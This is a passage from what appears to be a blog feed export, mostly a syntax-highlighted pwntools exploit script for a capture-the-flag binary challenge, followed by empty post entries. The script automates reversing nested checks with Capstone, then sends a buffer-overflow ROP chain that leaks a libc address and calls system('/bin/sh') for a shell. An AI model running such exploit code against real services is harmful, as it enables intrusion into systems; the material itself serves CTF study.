punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"password is \\\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>password <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"port: &#123;&#125;, password: &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\"># '''</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\"># binary: ./pwn-chal</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\"># write analysis here...</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\"># write exp in payload</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\"># '''</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>HOST<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input your password: \"</span><span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"/lib/x86_64-linux-gnu/libc-2.23.so\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn2\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    bytecode <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>md <span class=\"token operator\">=</span> Cs<span class=\"token punctuation\">(</span>CS_ARCH_X86<span class=\"token punctuation\">,</span> CS_MODE_64<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">find_main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\toffset <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>vaddr_to_offset<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>entrypoint<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\tdisasm_result <span class=\"token operator\">=</span> md<span class=\"token punctuation\">.</span>disasm<span class=\"token punctuation\">(</span>bytecode<span class=\"token punctuation\">[</span>offset<span class=\"token punctuation\">:</span>offset <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> elf<span class=\"token punctuation\">.</span>entrypoint<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> disasm_result<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t    <span class=\"token comment\"># print(\"0x%x:\\t%s\\t%s\" %(i.address, i.mnemonic, i.op_str))</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t    <span class=\"token keyword\">if</span> <span class=\"token string\">\"rdi\"</span> <span class=\"token keyword\">in</span> i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t    \tmain_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t    \t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t<span class=\"token keyword\">return</span> main_addr</pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">find_level0</span><span class=\"token punctuation\">(</span>main_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\toffset <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>vaddr_to_offset<span class=\"token punctuation\">(</span>main_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\tdisasm_result <span class=\"token operator\">=</span> md<span class=\"token punctuation\">.</span>disasm<span class=\"token punctuation\">(</span>bytecode<span class=\"token punctuation\">[</span>offset<span class=\"token punctuation\">:</span>offset <span class=\"token operator\">+</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> main_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\tcall_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> disasm_result<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> i<span class=\"token punctuation\">.</span>mnemonic <span class=\"token operator\">==</span> <span class=\"token string\">\"call\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t\t\tcall_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> call_index <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t\t\t\tlevel0_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t<span class=\"token keyword\">return</span> level0_addr</pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">check</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> level<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\toffset <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>vaddr_to_offset<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\tdisasm_result <span class=\"token operator\">=</span> md<span class=\"token punctuation\">.</span>disasm<span class=\"token punctuation\">(</span>bytecode<span class=\"token punctuation\">[</span>offset<span class=\"token punctuation\">:</span>offset <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> disasm_result<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> i<span class=\"token punctuation\">.</span>mnemonic <span class=\"token operator\">==</span> <span class=\"token string\">\"cmp\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t\t\tcurrent_level <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>level <span class=\"token operator\">==</span> current_level<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">find_next</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> level<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\toffset <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>vaddr_to_offset<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>\tdisasm_result <span class=\"token operator\">=</span> md<span class=\"token punctuation\">.</span>disasm<span class=\"token punctuation\">(</span>bytecode<span class=\"token punctuation\">[</span>offset<span class=\"token punctuation\">:</span>offset <span class=\"token operator\">+</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>\tcall_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> disasm_result<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> i<span class=\"token punctuation\">.</span>mnemonic <span class=\"token operator\">==</span> <span class=\"token string\">\"call\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\t\t\tcall_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> call_index <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t\t\t\tnext_level_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>check<span class=\"token punctuation\">(</span>next_level_addr<span class=\"token punctuation\">,</span> level<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>\t<span class=\"token keyword\">return</span> next_level_addr<span class=\"token punctuation\">,</span> call_index<span class=\"token operator\">-</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">check_last</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>\toffset <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>vaddr_to_offset<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>\tdisasm_result <span class=\"token operator\">=</span> md<span class=\"token punctuation\">.</span>disasm<span class=\"token punctuation\">(</span>bytecode<span class=\"token punctuation\">[</span>offset<span class=\"token punctuation\">:</span>offset <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> disasm_result<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> i<span class=\"token punctuation\">.</span>mnemonic <span class=\"token operator\">==</span> <span class=\"token string\">\"cmp\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token string\">\"eax\"</span> <span class=\"token keyword\">in</span> i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre></pre></td></tr><tr><td data-num=\"133\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">find_last</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>\toffset <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>vaddr_to_offset<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>\tdisasm_result <span class=\"token operator\">=</span> md<span class=\"token punctuation\">.</span>disasm<span class=\"token punctuation\">(</span>bytecode<span class=\"token punctuation\">[</span>offset<span class=\"token punctuation\">:</span>offset <span class=\"token operator\">+</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>\tcall_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> disasm_result<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> i<span class=\"token punctuation\">.</span>mnemonic <span class=\"token operator\">==</span> <span class=\"token string\">\"call\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>\t\t\tcall_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> call_index <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>\t\t\t\tnext_level_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>check_last<span class=\"token punctuation\">(</span>next_level_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>\t<span class=\"token keyword\">return</span> next_level_addr<span class=\"token punctuation\">,</span> call_index<span class=\"token operator\">-</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre></pre></td></tr><tr><td data-num=\"146\"></td><td><pre></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>main_addr <span class=\"token operator\">=</span> find_main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>level0_addr <span class=\"token operator\">=</span> find_level0<span class=\"token punctuation\">(</span>main_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre></pre></td></tr><tr><td data-num=\"150\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>level0_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre></pre></td></tr><tr><td data-num=\"152\"></td><td><pre></pre></td></tr><tr><td data-num=\"153\"></td><td><pre></pre></td></tr><tr><td data-num=\"154\"></td><td><pre></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>ans <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>next_level_addr <span class=\"token operator\">=</span> level0_addr</pre></td></tr><tr><td data-num=\"158\"></td><td><pre><span class=\"token keyword\">for</span> level <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">99</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>\tnext_level_addr<span class=\"token punctuation\">,</span> number <span class=\"token operator\">=</span> find_next<span class=\"token punctuation\">(</span>next_level_addr<span class=\"token punctuation\">,</span> level<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>next_level_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> number<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>\tans <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>number<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>last_level_addr<span class=\"token punctuation\">,</span> number <span class=\"token operator\">=</span> find_last<span class=\"token punctuation\">(</span>next_level_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>ans <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>number<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre></pre></td></tr><tr><td data-num=\"166\"></td><td><pre></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"!\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>pop_rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000406013</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>pop_rsi_r15 <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000406011</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre></pre></td></tr><tr><td data-num=\"173\"></td><td><pre></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>ropchain <span class=\"token operator\">=</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">0xd8</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rsi_r15<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"atoi\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x405EF7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>ropchain<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>atoi_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>libc_addr <span class=\"token operator\">=</span> atoi_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x0478c0</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>system_addr <span class=\"token operator\">=</span> libc_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x0554e0</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>binsh_addr <span class=\"token operator\">=</span> libc_addr <span class=\"token operator\">+</span> \t<span class=\"token number\">0x1b6613</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre></pre></td></tr><tr><td data-num=\"189\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"atoi_addr\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>atoi_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libc_addr\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"system_addr\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"binsh_addr\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre></pre></td></tr><tr><td data-num=\"194\"></td><td><pre>ropchain <span class=\"token operator\">=</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">0xd8</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>binsh_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>ropchain<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre></pre></td></tr><tr><td data-num=\"201\"></td><td><pre></pre></td></tr><tr><td data-num=\"202\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "http://example.com/2020/09/09/Basic/Linux-Labs/",
            "url": "http://example.com/2020/09/09/Basic/Linux-Labs/",
            "title": "Linux Labs",
            "date_published": "2020-09-09T11:43:56.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "http://example.com/2020/09/09/Reverse/easyre/",
            "url": "http://example.com/2020/09/09/Reverse/easyre/",
            "title": "easyre",
            "date_published": "2020-09-09T11:43:24.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "http://example.com/2020/09/09/Crypto/MD5/",
            "url": "http://example.com/2020/09/09/Crypto/MD5/",
            "title": "MD5",
            "date_published": "2020-09-09T11:43:00.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "http://example.com/2020/09/09/Misc/%E5%A4%A7%E7%99%BD/",
            "url": "http://example.com/2020/09/09/Misc/%E5%A4%A7%E7%99%BD/",
            "title": "大白",
